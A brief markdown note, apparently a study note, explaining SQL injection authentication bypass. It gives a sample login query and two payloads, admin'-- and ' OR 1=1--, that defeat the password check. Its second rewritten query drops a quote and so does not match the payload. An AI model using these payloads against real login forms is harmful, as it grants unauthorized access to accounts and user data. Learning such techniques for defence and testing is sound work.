# This is the methodology for SQL Authentication bypass

Generally a SQL Query for login looks like this -

SELECT * FROM users WHERE username = 'tom' and password = 'pass'

## CASE 1 - Attacker knows there is a user called 'admin'

An attacker can enter the following - admin'--

What this does is
SELECT * FROM users WHERE username = 'admin'-- and password = 'pass'
the '--' comments out everything after it so it just matches the admin username and logs us in

## CASE 2 - Attacker does not know the admin username

The query would generally process the first user whose details are returned, this is exploited by
' OR 1=1--

SELECT * FROM users WHERE username = 'OR 1=1-- and password = 'pass'

And this can return details of all users as well.
